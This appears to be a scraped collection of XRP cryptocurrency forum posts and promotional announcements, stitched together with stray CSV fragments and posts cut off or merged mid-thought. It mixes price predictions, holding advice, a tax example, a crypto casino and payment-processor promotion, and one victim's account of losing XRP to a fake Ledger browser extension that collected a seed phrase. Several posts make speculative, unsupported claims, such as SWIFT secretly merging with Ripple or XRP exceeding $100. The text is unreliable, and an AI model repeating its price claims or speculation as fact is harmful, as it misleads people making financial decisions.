Here at EarnBet.io, we made it a priority to add XRP as the featured coin in our profit-sharing casino. Below are a few reasons why we thought XRP was a better coin than the usual suspects like BTC or BCH:

* Funds are near-instantly confirmed after a user transfers funds to their deposit address. Even with a minimum fee, XRP is confirmed within seconds, something important to our players.
* Transactions are incredibly cheap! Players can deposit and withdraw without any significant transaction fees. If a user wants to deposit $10 of BTC, they might think twice before paying a $1 transaction fee, or spending 1 hour for the transaction to confirm. With XRP, you can get right into the action.
* Our players also appreciate the human-readable denominations of XRP. Instead of betting with 0.000001 BTC, you can just place a bet of 1 XRP. It‚Äôs easy to be a high roller by betting 1,000 XRP at a time‚Ä¶not quite the same with Bitcoin!

XRP has proven to be a popular coin choice by our players, and our broader community has enjoyed receiving XRP dividends. 

We strongly encourage other companies in the gaming and entertainment industries to add support for XRP. It‚Äôs easy to set up, and your community will thank you later."

So, a few weeks ago, SWIFT just randomly stopped trying to build their own blockchain/ledger.  I find it heavily suspect that such an absurdly large organization would simply give up on a technology that even they called ""encouraging"".  What's odd is that this happened right around the same time that Brad said Ripple was going to stop announcing new banking partnerships. What if SWIFT actually just struck a deal with Ripple to leverage their technology (since they can't seem to build it) and they are currently merging their clients?  This would solve SWIFT's tech problem and Ripple's bank relationship problem in one fell swoop.

It would also explain why Brad is so confident that they will be signing ""a bank a week"" because he knows that with SWIFT on their side, they have their foot in the door with ALL the banks, now it's just paperwork and logistics. 

It would also explain why SWIFT tweeted today that their customers must ""change their interfaces and business systems"" by November.  Maybe SWIFT is prepping to flip a switch and have the entire world banking system switch over to xCurrent with the option of using the cheaper and faster xRapid.  Maybe, just maybe, SWIFT is full of smart people that know they aren't a Silicon Valley technology company and they would rather focus on their strong suit, banking relationships.  Peanut butter, yo.

It would also explain u/bearableguy123's absurd price prediction of far over $100 in 2018.  If his prediction is true, like his track record, Ripple HAS to be growing at an incredible rate behind the scenes and this seems like an obvious shortcut to be able to do so.

Maybe the play isn't to replace SWIFT, it""s to be SO much better, that you simply become SWIFT.

0,xrp,"To stop panic-selling from new XRP buyers, show this to a friend who is uncertain of the present cryptocurrency market. Hi guys,

Traditionally BTC has always controlled the market. I've been an off and on trader of XRP for the past year. I'm now ""married"" to XRP as a digital asset. **I am not a financial advisor, but I'll give you a piece of info you all must know.**

There's a fair chance that someone who is new to XRP would stumle upon this post. But traditionally BTC has always dominated the market.

**First, pay zero attention to the USD value. USD value only matters if you want to ""cash out."" Instead pay attention to the ""Satoshi"" value. Context below.**

1 Satoshi = 0.00000001 BTC       
100 Satoshis = 0.000001 BTC         
1,000 Satoshis = 0.00001 BTC         
10,000 Satoshis = 0.0001 BTC

About 12 hours ago XRP was 8200 satoshis for one XRP. At present it's about 8600 Satoshis for one XRP. The value increased, and it has solidified itself in the number 2 spot. The red numbers in terms of ""falling price"" is misleading.

I made a post about this yesterday. **Financial institutions are holding XRP and cannot panic-sell it because it is an essential tool for Xrapid. This is probably one of the key reasons why XRP has tumbled the least over the past 36 hours.** 

Further, if XRP were to surpass BTC in terms of marketcap, trading would simply need to be 4 times higher than it is right now. This is a project with 6 years of effort put in to it, fromer employees of SWIFT and the SEC work at Ripple. Last but not least, Ripple is doing everything they can to jump every regulatory hurdle they can."

0,xrp,"Anti XRP sentiment has infiltrated r/XRP Plain and simple, as the title says, either an organic sense of negativity or an orchestrated and organized attack on XRP has began creeping into this sub. 

I get it. Value of XRP has not skyrocketed us all into the millionaire orbit and, combined with (for many) the lack of patience, these late bear market doldrums can be aggravating.

But. 

This still doesn‚Äôt fully explain the recent influx of negative comments and posts ive been reading in here.

I am not one to ignore rational and fact based arguments against anything. Im willing to accept bad news about Ripple and XRP if its accurate. So it isnt with blindness that i maintain optimism about both xrp and ripple, and that the current xrp value is only temporary as the market and demand matures. 

I think most here are like me. So thats why i have a difficult time believing that the posts and comments that sound an awful lot like those parroted in subs like r/BTC against xrp are truly from xrp supporters. And not from a group trying to negatively influence the mood of xrp.

After being able to recover a bit from my losses, and pay all bills she told me she paid but didn't. I had a little bit of money left. Cryptocurrency was looking really interesting for me, and I had a little bit of cash to spare. Not knowing anything about it, I googled the ""purposes"" of a few crypto's. Decided XRP looked the most interesting, and bought in @0,80 euros. 

A few days later XRP was almost 2,8 euros. But I decided not to sell, even though I needed the money. Obviously it dropped, but no regrets! I will only sell when XRP will be really completely implemented by many banks. And even then, I might stil HODL to those coins if I don't need cash. 

Now every once in a while, I add a little XRP to my wallet whenever I have a few euro's to spare. Soon my divorce is over, and I will have climbed out of all the debts my soon to be ex made, and might have some extra money to invest in XRP! 

Right now I am sitting at around 500XRP, probably nothing compared to most people here. But I am a proud HODLR even right now with all the commotion around cryptocurrency I am certain XRP will not be affected to much as it's an unique coin!

XRP now has the number 2 spot with over a $3 billion lead. Impressive. I think either some xRapid production volume is starting to flow keeping numbers up or maybe market sentiment regarding XRP is finally starting to change.

0,xrp,"The case for not selling during a spike in price (US taxpayers) I see quite a few people here saying that if XRP is listed on Coinbase they expect a spike in price and that they will sell at that high with the intent to buy back not taking into account the tax implications. Here‚Äôs a quick scenario that is applicable to those that are US tax payers and have held XRP for less than 12 months, have a moderate income (tax bracket purposes), and believe in XRP in the long term (or plan on reinvesting)

Say you bought 1,000 XRP in Dec at $1.00 each ($1,000 total investment). Your value a month later in Jan is $2.50 each and now worth $2,500.  The following month, Feb, XRP is listed on Coinbase (or whatever causes a spike) and goes to $4.00 making your investment $4,000. You think the spike is short lived and want to take your profits with the intent of buying back in so you decide to sell and bank a profit of $3,000. What price point should you reinvest? 

Because you sold within 12 months of owning it, you will have pay short term capital gains tax. Middle income that would be roughly 25% meaning you will owe the government $750 come tax season leaving you with $3,250 to reinvest. In order for you to get your original 1,000 ripple BACK you need the price to drop back down to $3.25. 

Instead, you hold for a year and then sell, this time you are only taxed 15% of your profits. 


[Capital Gains Tax](https://www.fool.com/retirement/2016/12/16/capital-gains-tax-rate-for-2017.aspx)


TL;DR - before you sell during a price spike think about the short term capital gains tax you‚Äôll be hit with... it sucks.

**TLDR:**

I have watched our xrp transfer from our account to an account that is currently holding over $2.5 million in xrp. This is clearly a large operation. Details below:

The Chrome app is no longer live. I have however seen it re-uploaded this morning and have reported it. If you do a search for Ledger in the Chrome Store tomorrow morning I am sure you will see it there. Original links to said app:

I‚Äôm self isolated as I am one of the many victims of Covid-19. I‚Äôm confined to a room in our house while my husband who is a key worker, continues to leave for work each day during the UK‚Äôs first lockdown. He‚Äôs an absolute hero, but I desperately wish our circumstances where different. I desperately wish I could just hug him.

I have little but a laptop to keep me sane during the day at the minute, so I am frequenting Reddit often and keeping an eye on the crypto markets. Due to the situation right now money is tight, however I had worked out that by consolidating a few of our other crypto I would be able to recoup around 20% of our losses to help.

We have our xrp stored in an offline Ledger Nano. The keywords are stored in a separate location and I knew never to divulge them to a 3rd party. Why I ended up doing just that, I can‚Äôt explain or understand. I can only put it down to the constant fever brought on by the virus. Believe me guys, this isn‚Äôt like flu!

So‚Ä¶ I begin the day by selling a load of our other crypto currency for bitcoin, sold some to help us and I then consolidate the remaining into xrp. I then load up our Ledger. It‚Äôs been a while since I last accessed our Ledger (2018), and have since changed my computer. I recalled the Ledger having a Chrome extension and this is when the scam starts.

The only ledger extension on the Chrome store is one by the name of ‚ÄúLedger Wallet‚Äù or ‚ÄúLedger Live‚Äù. It claims to be from [Ledger.com](http://ledger.com/) ¬Æ or Ledger Official ¬Æ and for all intents and purposes looks legitimate. It even had over 70 positive 4-5 star reviews, ranging from ‚ÄúIts a little difficult to operate‚Äù to ‚Äúonce I understood what to do it was easy‚Äù.

Once you download the Chrome extension, it will ask for the version of Ledger you are using, followed by a screen prompting you to fill in your full set of keywords.

I sat there typing each keyword out, double checking each one and not once did I think that this app wasn‚Äôt legitimate. I feel so very stupid.

The app didn‚Äôt appear to work, so I downloaded a trusted wallet instead. I thought nothing of it and continued.At this point our Ledger contained 14,908 xrp. My husband and I had built this up as our nest egg since 2017.

As I started to look into transferring the small amount of xrp I had recouped that morning, out of the corner of my eye, I watched as 14,889.740739 xrp vanished from our account. The entire process took less than 8 minutes.

Due to the virus and shock, I believe I may have then fainted. I cant be sure.

I have since filed a report with Ripple, the FBI and my local Fraud Police. My husband has been ridiculously understanding. He says its just money and right now our focus should be on getting better / staying safe. I feel devastated.

I apologise for how long this post is. I guess I wanted to vent a little too. I‚Äôm so upset.

What is my take on this? I have no way of estimating by the numbers, but I would think this means that the financial institutions using XRP and Ripplenet for remittances are holding on to the coin (this should be obvious. They see the practical use of XRP, and they must also use it on a daily basis, and I believe an employee stealing XRP to liquidate it would be a criminal offense). So, on the plus side we are losing less.

On the bad side, that means we, as retail investors, will gradually begin to lose influence on the market. When the snowball effect of the market kicks in, us buying and selling will have little impact on the price of an individual XRP. This, however, is not a negative as I believe a higher-priced XRP would indicate a healthier environment for the token itself.

0,xrp,"XRP revisiting #2 MarketCap and Declining Bitcoin Dominance Total market cap for Cryptosphere is at $215B and remains significantly below where even the lowest positive conservative estimates are projecting.

It appears the growth and excitement of XRP news and increased token price and the anticipation of the hard fork of BCH have really  spurred this latest run up.

XRP is within $.5B of overtaking ETH for the number 2 position in market capitalisation once again.

For those who don't believe market capitalisation is important, consider the % allocations of financial products (ETF) makeup when approved.  ETF's will be based on a basket of tokens to mimic the overall market to reduce risk.

Additionally, Bitcoin dominance is trending back to closer to the 50% range.

I am hopeful XRP will continue its' run and we see continual increases until we put ETH in the rearview mirror in regards to market cap and broader acceptance,

While I am hopeful for big jumps, I think we will continue to see a slow and steady rise as we move forward and prices like .50 will be a sweet memory.

Good luck to all and be patient and keep the faith in the Ripple team, XRP as they transform the current remittance system and you into wealthy early adopters!

0,xrp,"Thinking of converting almost all my bitcoin to xrp So lately I‚Äôve been thinking of converting all my bitcoin to xrp. I don‚Äôt want financial advice, and I‚Äôm doing my own research but just part of that research is that I‚Äôm interested to see what other people‚Äôs thoughts are.

Obviously I want to diversify my investments and I do. The thing that‚Äôs getting me to think this way is simply that I feel xrp is currently so undervalued I can‚Äôt imagine that in the long run that once it has a nice run up it will ever be .17-.18 cents again. 

Also the all time high of bitcoin would only double my money while the all time high of xrp would be much more than that. I personally also believe in the long term fundamentals of xrp more than bitcoin and my trading plan was always to make profits on bitcoin and then dump it into xrp and whatever else gets my interest such as vechain, cardano, etc so that‚Äôs the thing holding me back. Should I just stick to my plan?"

0,xrp,"The average crypto enthusiast/investor is delusional? I realized this today after seeing the top heavily upvoted post on the CC sub was about how crypto won't take over until KYC (know your customer) is eliminated. Basically all payments are anonymous.

My opinion is that the elimination of KYC will never happen and by and large the general public really don't want it to happen. There's a ton of benefits that come with KYC that the average person enjoys and does not want to give up. Things like figuring out who charged you, denying payments, issuing chargebacks, and the biggest: receiving insurance to cover your funds should they ever be stolen/lost (either from an outside source or your own negligence).

And that's just for the average ""user"" of any currency. Governments themselves definitely do not want KYC to go away. If anything they want way more tracking. Apart from being a massive crime deterrent, KYC is how you ensure you get your taxes. If KYC goes away I honestly don't know how governments even function. We return to door-to-door tax collecting by the traveling tax man (at gunpoint if necessary) like we did in the 1700's?

If anything crypto is going to bring far more KYC for the average person. They'll use some institution(s) to store their currency which will tie their info to the blockchain and then the government will be able to see exactly where everyone spends their money. Taxes will be automated. This is sort of dystopian I know, but I believe it is the future we are heading toward.

Figuring out anonymous crypto and decentralized exchanges is far too daunting for the average person, and that's if they even wanted to dodge KYC, which the vast majority don't. If I store my currency myself, and then someone gets my passwords, or I just accidentally type in the wrong thing and send too much or to the wrong person, well my money is just gone *poof* and I have no recourse. We've seen countless examples of theft, lost keys, and transaction mistakes costing people thousands if not millions of dollars. The average person does not want to take on that kind of risk by being solely responsible for their money.

My personal guess is, that whales use short futures for betting on dropping BTC prices with FIAT money and then manipulate market like we saw it in the last dumps.

Well, we may need to put ourselves in our friends and family‚Äôs shoes.

Remember! they don‚Äôt have a clue about what this is. They are bombarded with so called opportunities. Like Multilevel marketing crap. So when you come along telling them ‚ÄúThey can make sooo much money‚Äù on this new thing...well,they have heard this pitch before ...Its not easy for them. 

For ex. I have a friend who has for years been telling me to wholesale real estate and says its soo easy... but because I don‚Äôt know about it and I don‚Äôt know the first step I just basically ignore him because I don‚Äôt have a lot of money to take chances on something I don‚Äôt know about. I don‚Äôt speak the language of real-estate, so its hard for me to respond or take action. 
So this is what is happening when you try to tell your friends and family about XRP. And they ignore you because its a foreign language. So obviously they don‚Äôt know how to respond if they don‚Äôt speak the language. 

Also realize they could be right and you wrong. We have no guarantees just great, likely and hopeful possibilities. So all though we have educated ourselves and are excited about the possibilities, we should make a little room for other‚Äôs points of view and  perspective. If it doesnt work out, do you want all the people you know looking at you in a bad light. 

So I never advise  people when it comes to opportunities but if I did..I would always warn my friends and family that you may very well Lose if you invest and not to invest more than some pocket change.  This way, regardless of the outcome you are in a good place relationship wise with your friends and family because really, what is money without the ones you Love.

I'm talking from the ""certainty"" point of view, you won't know if the exchange will really honor the funds, deliberately delay, etc. But then I tried to dig deeper on the OTC cash out process but I can't seem to find any answer.

Currently, the ideal way I'm thinking is to personally go to THAT country where the OTC is, personally deal with the people/staff there, once they located the buyer side and secured deal, I expect the money will go to my bank account straight instead of going through the worry of waiting by using an exchange. Of course, to smoothen the whole process considerably, I would talk to the bank that I planned to cash out with first, informing them the incoming money and how I legally acquired the initial investment before travelling abroad to cash out in person.

What do you think? Anyone can provide suggestions? I'm currently eyeing on HiveEx as my OTC choice but kindly recommend better ones if you know which. My exit target is $100 per xrp. I'm also thinking that if xrp reached that price it means adoption, I might be able to just find banks and sell directly to them at a lowered price per xrp (because there is no incentive for them to buy from you in market price).

I‚Äôm sure there is some of that. I thought it would be good to share a more positive perspective.

I entered crypto in 2017 circa BTC at 4000. I played around a little and did ok. Nothing spectacular. I was riding the wave. At some point just past the peak of crypto-fomo, I had done enough research to personally conclude that XRP (and the Ripple ecosystem) made the most sense for my long-term investing. I made the move to XRP. I didn‚Äôt move simply to make a buck (well, not short term) but because I believed Ripple/XRP had the most potential to create a financial paradigm shift within our existing financial system. I give a LOT of credit to the BTC folks. I love the Crypto concept (I am technical by trade) and BTC did a wonderful job creating an amazing asset and setting the stage for a new technology. But you can‚Äôt simply replace banking with crypto. Banking isn‚Äôt going away. It never will. It can‚Äôt. It makes more sense to integrate a crypto-banking dynamic in to our existing system. While every other crypto concept was building their own proverbial island and asking the world to move in, Ripple was building proverbial bridges and (most importantly) building sophisticated relationships within the global financial infrastructure. I concluded that Ripple had the best scaffolding politically, practically and technically to transition the world to a crypto dynamic. I only believe that more today.

But I‚Äôm (mostly) preaching to the choir here - I don‚Äôt mean to open the ‚Äújustify XRP‚Äù conversation. If someone is interested in that or asking questions, check out the official links on this sub, our dear friend /u/hodor777 ‚Äòs blog and all of great information made available by Ripple. The point that I am making is that in 2017/2018 ‚Äì at FOMO peak, I went all in with XRP. I bought during the bubble. I was crushed with the crash just like everyone else.

But I never sold. I‚Äôve been cost-averaging all the way down, knowing that my short-term view has the potential for painful losses.

Why? Because I did do my own research in 2017. Because I have continued to research and re-evaluate my decision criteria. Because I do still believe this investment (as risky and erratic as the market is) is the best representation of the potential Crypto future.

Here is my point - I was crushed as a 2017 FOMO buyer. The speculation was ahead of the progress. But that does not undermine the successes (then and now) and the critical mass Ripple has created.

In the end, I believe we will hit $10 one day (if we can hit ~$3.00 on pure FOMO and limited market access, $10 with IoV adoption and/or banking use is easy). If I believe that, it is only reasonable for me to continue to accumulate. Quite honestly, I‚Äôm glad I‚Äôve had the opportunity to pick up XRP at prices I thought I had missed. In the last year, I‚Äôve been able to reduce my cost basis by over 60%. If we crash to .10, I‚Äôll be buying more. I‚Äôm preparing to ride another wave. I simply want more XRP. I‚Äôm willing to take hits to my pride and portfolio on the way there.

I‚Äôm not looking for a pat on the back here. I‚Äôm trying to point out that while there were a lot of uninformed buyers, that is not the full picture. The early adopters are not the only folks who invested with their eyes wide open. We are going to win this race. We just don‚Äôt know how deep the correction will be before that happens."

Been following the economy very closely and studying up on the stock market and how everything is quite connected. Looks like there could be a pretty big sell off similar to japan in the 90‚Äôs.. a massive crash. Now when this happens due to fractional reserve lending and the huge derivative market, I feel as though the liquidity crisis we are about to experience is going to be absolutely MASSIVE.... people thought banks were insolvent in 08‚Äô and this is triple the problem or worse now. All these banks having access to ripple net, makes me think that once the crisis commences these banks will be forced to flip the switch onto ripple net and utilize XRP as a source of liquidity because, well it‚Äôs the only option... now I‚Äôm not the most educated on this but I feel like the amount of liquidity that‚Äôs going to be needed is going to be well into the trillions if not more... meaning XRP‚Äôs price is going to be very high.

0,xrp,"Three very good reasons why you should not panic-sell your xrp! Regardless of the Temenos T24 ""switch"" that is supposed to get flipped on in the next 10 hours or so according to SamIam's most recent live stream, I will continue to purchase XRP as long as it is a reasonable price. I love Sam's content, but I think we should stay grounded for the time being, and simply assume XRP will be the standard. With regards to speculation on T24 and Temenos, it will most likely take place in the next 24 hours. I will not cite the Temenos T24 / SR2018 ""switch flip"" as a reason, because it is nothing more than speculation for the time being. If you would like to keep your eyes glued to this event, you can watch the time in Geneva here, and pay very close attention to fluctuations during business hours (If this event takes place, it will be when I am asleep): https://www.timeanddate.com/worldclock/switzerland/geneva

**EDIT: If you want speculation, we had a flash-crash an hour ago at about 9:00 A.M. Geneva Time. See here:**
https://xrpcharts.ripple.com/#/markets/XRP/USD:rhub8VRN55s94qWKDv6jmDy1pUykJzF3wq?interval=5m&range=1d&type=line

Three reasons to hold your XRP:

- Financial institutions have XRP. They, as far as I know, are not obligated to sell XRP.     
- A lot of people are speculating (myself included) that people are dumping BTC and ETH to get in to XRP.       
- Besides Tether, XRP, has tumbled the least with this plummet in the market. This is a necessary trend that must continue if XRP is to surpass BTC."

0,xrp,"Regarding the upcoming months Take everything I say with a grain of salt. I‚Äôm not a financial advisor, nor do I have a crypto crystal ball on what is going to happen regarding the price of XRP.

- First off, anyone who tells you to buy more, hold, or sell because the price is going down... MORE than likely doesn‚Äôt know what‚Äôs going to happen with the price. If anyone knew, they‚Äôd be rich as hell and not posting or commenting on forums or Reddit. That being said, do what you believe is right. Make a decision and stick with it regardless of the outcome. 

- If you‚Äôre holding, I know it‚Äôs been said a million times, and it‚Äôs super hard to do, take a break. Seriously, stop checking the price a million times a day and really sit back and think of all the hours you‚Äôre wasting in the day just monitoring the price. I‚Äôve done my research, and I‚Äôve made my decision. I‚Äôm 100% confident in the Ripple team. I don‚Äôt know if it‚Äôs going down due to manipulation, people getting bored, bitcoin decoupling, etc etc... but I know what I know, and with the information I‚Äôve spent hours researching is what helped me decide. 

- On the other hand, if you didn‚Äôt listen to the ‚Äúinvest what you‚Äôre willing to lose‚Äù and went in with money you can‚Äôt afford to lose expecting a get rich quick type of thing, you‚Äôre everyday life is more important. Bills, Family, so on and so forth should take priority, and that has nothing to do with crypto, it‚Äôs just being a decent human being who isn‚Äôt financially jeopardizing themselves or their families to take a chance on making more money. 

- On the other other hand, if you invested what you‚Äôre willing to lose, and I get it, nobody wants to lose, and you‚Äôre debating on buying more with money you absolutely don‚Äôt need, then of course it‚Äôs not a bad idea... Even if the price drops to .25 cents, when you‚Äôre looking at $5-$10+ dollar price point, do you think that .15 cents is going to make a significant impact on your overall profit?

- End note- one thing I‚Äôve actually noticed is a LOT of ‚Äújustified FUD‚Äù regarding Ripple and XRP lately on the forums. I‚Äôm on different subreddits and forums more than I‚Äôm proud to admit haha, and I‚Äôm usually just an observer unless I really feel the need to comment on a post or respond to a comment on a post. The justified FUD I‚Äôm referring to would be like ‚ÄúI‚Äôve noticed a strange price movement, do you think the whales know XRP is going to be deemed as a security?‚Äù Or ‚ÄúSBI isn‚Äôt really going to affect the price if you really think about it‚Äù. My point is, if you see people spreading false information or ‚Äújustified FUD‚Äù, respond to them with facts and knowledge, don‚Äôt blindly believe what you read, whether it‚Äôs comments on forms/Reddit, or even news articles. 

**TL;DR** sorry, I can‚Äôt summarize it haha read it or don‚Äôt.

When you scroll down the news, it seems like there‚Äôs never ever a dull moment for XRP community. News about xRapid project and giants like [Exim bank joining the parade](https://www.coindesk.com/euro-exim-bank-taps-ripples-xrapid-for-cross-border-settlements) don‚Äôt go unnoticed. Well, we intend to add to it by offering our own contribution to the success of XRP ledger.

To start with, we are CoinGate, a payment processor that allows merchants to accept a wide variety of cryptocurrencies for their goods and services. We are here to let you know that from now on, XRP is joining our bundle of native cryptocurrencies! It is fantastic news for those who use XRP ledger, and there are two main reasons for it.

First of all, more than 4,500 merchants who avail of our payment gateway now accept XRP at their online shops! It is a very simple process - find yourself a merchant, choose to pay via CoinGate and select XRP to finalize the payment. That‚Äôs it! No hidden fees or anything like that. 

Plan on traveling? [Book a hotel](https://www.travala.com/)! Bored? Buy yourself a [video game](https://www.mmoga.com/), or just [play one online](https://www.torn.com/). Does the online world scare you sometimes? [VPN might help](https://surfshark.com/). Looks like there are plenty of things you can buy with XRP these days! 

And secondly, any business can now accept XRP, among many other cryptocurrencies, as a mean of payment. All they need to do is go through a simple integration. If you‚Äôre not sure if you should actually do it, we suggest reading our article about [why it is worth accepting crypto, as well as how exactly do it](https://blog.coingate.com/2018/11/accept-bitcoin-payments-in-business-why-and-how/). 

And that‚Äôs it. We hope that in the future, more and more merchants will start to embrace the blockchain technology, and accepting cryptocurrencies like XRP will become a common thing to do. This is our ultimate goal, and thus we will continue to expand our list of supported cryptocurrencies. Hopefully, you will help us out by spreading a word that you can always start accepting crypto if you wish so. It doesn‚Äôt take much effort at all!

Thank you for sharing your time and have a nice day!

As soon as there's a market movement, down or up, they are quick to comment ""Oh no, why does it go down?"" or ""This is it, MOOOOON !!!!!!(the latter being the most annoying). Stop focusing on ups or down, FOCUS on the VALUE of what you have. In order to determine that value one must proceed with his own research, setting your own parameters (Fundamental or Technical), that belongs to you. When you find that VALUE, it doesn't matter if it's at 0.00000001 or 100000000 because somewhere down the road of Market Supply and Demand the true VALUE of that which you HODL will be made manifest (adoption, use cases, demand etc...).

**Correspondence Bank- Heart of Remittance Market**

Imagine you are in Fishers of Indianapolis and want to go to Chennai, India. There's no direct flight(Private Jet Flyers, please excuse!). So you need to go to Chicago O'Hare International Airport, catch a flight from Chicago to Dubai and *Dubai International Airport* to Chennai. To reach some places you may need to catch 3 or more connecting flights. Same way to send money to other country the FI uses Correspondence bank just as connecting airport, to transfer money for some remote places there may be couple of correspondence banks involved. This kind of setup increases **time** and **cost**for both traveling and sending money

**London Heathrow Airport (LHR)** ranks as the most internationally connected airport across the globe as it is located between east and west.

**XRP** \- Is like Next Generation Pods which can teleport you in 3 Sec to any place at very low cost. You can walk to any near by bus station , Railway station or Specialy build Stations **any time** and get into any pod and just enter your destination and boom you will reach in 3 seconds to your destination. What Ripple is doing now is to make new pod stations and modifying existing Railway and Bus station to accommodate their tech.

**Failure of LHR**

Imagine when there's systematic failure of LHR Airport, the chaos and panic it will set in the world, how many people will be stranded and critical goods will be stuck. This will backlash on other airports and will have cascading effects on global air transport.

**Deutch Bank**

Deutch Bank is the largest correspondance bank and plays a critical central role in global money movement or global liquidity.

Deutch bank prices are crashing over last 12 months, it has crashed 50% and **80%** in the last 5 years , upside you can go 36000% but on downside you can go only 100%. $DB has derivative exposure double the size WORLD GDP. If $DB goes down as Lehman Brothers, it will dry up global liquidity and put world economy at brink of collapse, all the **temporary fix**done for the last 10 years will come back with vengeance.

**So who will rescue the world ?**who is building alternate superior tech for money transfer for the last 6 years?

**Exciting part of flight journey**

We are heading to Liechtenstein, we catch a flight and are in our seats and pre-*flight* safety briefing is also finished, aircraft starts taxiing to RUNWAY. For first timers it seems that the Aircraft is moving pathetically slow, even slower than a broken car and they start to wonder will this machine really fly? Then the Aircraft slowly moves to the runway on a long stretch of road, it halts for a brief moment and you see AirHostess scrambling to be in their respective seats and wearing seatbelts, now you can feel couple of tests being performed by Pilot. Suddenly the JET engines comes to life and the aircraft starts moving like hell through the runway then you can feel you **being lifted in the air**, you can see from window buildings, trees, vehicles getting smaller and smaller and within minutes you are up above the clouds and then when it reaches at cruising altitude where all becomes normal and boring.

The most existing part of flight journey is the TAKE OFF...

XRP is **taxiing** right now

0,xrp,"Haven't gotten a hardware wallet? Have a spare phone/offline computer? I know most of you probably already know this, but I was excited to learn about offline transaction signing, and wanted to share with those not aware.

I wanted a way to be able to securely move XRP without ever exposing my secret key being on an internet connected machine.  

Using toastwallet I am able to fairly easily accomplish this.  It's a bit cumbersome, but gets the job done.  If I start needing to move things on a regular basis I'll invest in a hardware wallet, like a Nano Ledger S, but until then my current setup is sufficient.

&#x200B;

I have one android that I've wiped, it's encrypted.  I put it on wifi to get toastwallet, and now it's destined to remain forever in airplane mode.  I fully setup my account on this phone while it was offline, from a paper backup of my secret.

&#x200B;

On my main phone I have toastwallet installed, but nothing configured except the pin/passphrase that it requires (although these are irrelevant because I'm storing nothing on this instance of toastwallet).  The only reason to have it is in order to process an offline transaction which obviously requires internet.  

With your offline device you simply generate the transaction you want.  My exchange has QR codes making it easy to populate the receiver information.  Otherwise you'll have to type in the destination address which would be a pain, but hey, it works.

Now read the QR the offline device generates with your online/empty toast wallet and send.  Felt good to see it work so quickly, and with the feeling of security of not having exposed the secret.

&#x200B;

This video shows someone demonstrating the process, although's using an offline PC to generate the signed transaction:  [https://www.youtube.com/watch?v=Lv0RoGgxdy0](https://www.youtube.com/watch?v=Lv0RoGgxdy0)

0,xrp,"Keeping confidence in XRP Over the last few days there has been some heated posts about losing confidence in Ripple/XRP.   I thought I would lay out my opinions and what I think about in order to keep my confidence in XRP.

Ripple are one of the hottest Silicon Valley ‚ÄúStartups‚Äù and are strategically positioned in the Bay area. 

Ripple have a top notch and extremely dedicated team. Chris Larsen, Brad Garlinghouse, David Schwartz just to name a few. All of who are extremely professional, talented and technically brilliant guys. 

Ripple own the majority of XRP, therefore they have a clear interest in utility, adoption and the future price.

Ripple are expanding into more corridors utilising XRP

Ripple have met with the IMF and BIS on multiple 
occasions and demo'd RippleNet and the XRP digital asset

Ripple working with SBI and pushing for adoption with digital assets, specifically XRP (Old article, but valid source) https://ripple.com/insights/sbi-holdings-views-on-blockchain-and-xrp-an-interview-with-yoshitaka-kitao/

$50million investment into MoneyGram to help kickstart XRP utilisation.  With great feedback from the CEO, Alex Holmes stating transactions are now settled within seconds utilising XRP

Money spent lobbying the White House staff on the importance of digital assets, attempting to bring attention and demonstrate their utility, as well as clarify any confusion or concerns

Xpring - An initiative by Ripple to grow the XRP ecosystem by investing and providing grants to companies that utilise the XRP asset and XRP ledger

Raising a $200million Series C round of funding to help drive XRP forward (Development and adoption)

Working with third party entities, i.e. SEC and Faster Payments Task Force to understand what they expect, and how Ripple can comply with any regulations or framework policies they are trying to create

Opening an office in Washington DC with a dedicated regulatory team, with the intension of being close to the US Government and White House

Recruiting new engineers and managers for ODL - https://ripple.com/company/careers/all-jobs?gh_jid=2142344

Working with Coinbase to drive cryptocurrency adoption

To address people‚Äôs concerns about Ripple moving away from XRP and digital assets or simply utilising another digital asset.  I believe this will not happen for the following reasons, trust and reputational damage.

If Ripple decided to pivot away from digital assets and drop XRP then the work outlined above would be all for nothing.  Most importantly they would damage their reputation, outlining XRP as the core to their ODL strategy, promoting a digital asset to the SEC, IMF, BIS, SBI Holdings, hosting Swell events etc and then stating ""We no longer want to go down that route, we wish to utilise another digital asset or no digital assets at all and remain with xCurrent"" would damage their reputation and question their credibility.  

It may also require modifications to the RippleNet implementation in order to remove any trace of XRP within the codebase (I am assuming this has been architectured in a loosely coupled manner where an asset would be interchangeable), however any amendments would include redeployment of software to existing clients infrastructure (Banks and exchanges) and full end to end testing to deal with a new digital asset, ensuring it works in the correct manner, as well as performing regression testing to ensure the software works as expected without XRP.  This incurs additional business cost and introduces risk, if it went wrong it would make them look rather foolish.

It would also be terrible for the community if they dropped the XRP token, not to mention the amount of people who will believe they have been misled with Ripple's website stating where to buy the asset. 

https://ripple.com/?s=xrp

If they decided to go with another asset, who would even buy into it? Their reputation would be tarnished, no one would trust them and people would potentially try and raise a lawsuit against them, setting them back further within the digital asset space.

Saying the above, I believe we are still years away. (3 - 5 at least). I believe it all comes down to regulation.

Unfortunately Ripple cannot just green light digital assets and use XRP across RippleNet for every customer, it is outside of their control until regulations are in place and XRP is deemed/cleared of being a security. Ripple have to be patient with regulations and work with the right people to ensure they understand the benefits of this technology and align with the policies that will be outlaid in the future. 

IMO, the SEC need to be clear on wether or not XRP is a security and then implement a clear regulatory framework which Ripple can work with and align their strategy from a legal and regulatory point of view. Once this happens the ball can start rolling properly, Moneygram does not need to be the only way to utilise XRP, banks could then start to show interest in holding these types new assets etc.  

If anything comes of this is what we are all speculating on.

I personally know it‚Äôs hard watching the price fall constantly, being in the dark about progress, trying to improve a $155 trillion market without proper regulations will not be easy for Ripple.  They have however been one of the most proactive companies trying to push forward within the digital asset space and we should be grateful for their efforts.  

I‚Äôm hoping the new podcasts will help people realise what a great job Ripple have done so far and restore people‚Äôs faith, as well as answer people‚Äôs questions regarding the technology and how Ripple believe utilising XRP will evolve over the coming months/years.

Overall the technology works, is efficient, secure, stable, scalable, provides a use case and helps solve real world problems with liquidity and cross border payments.  Regulations are key to drive this forward and we must have persistence and be patient.

Thank you for your efforts so far Ripple."

I recently sold my holdings, as planned at the low of 21c (Aus) to invest in the regular stock market which has done well.

My question is, as XRP is effectively a bridge currency, what is stopping anyone, say BOA or the Fed even creating their own utility token to serve the purpose.

\#1. Ripple stated that they have been buying XRP in secondary markets and may continue to do so. This makes me worried. I am wondering what your take is on this.

The report says:  ""Ripple is reducing its emphasis on large treasury payments‚Äîwhich are traditionally used to fund businesses and services in the absence of real-time transfers‚Äîto support individual, low-value transactions, addressing the growing need in remittances and small- and medium-sized enterprise payments."" I don't understand the reason for slowing down the large treasury payments, because that's where the real money is.

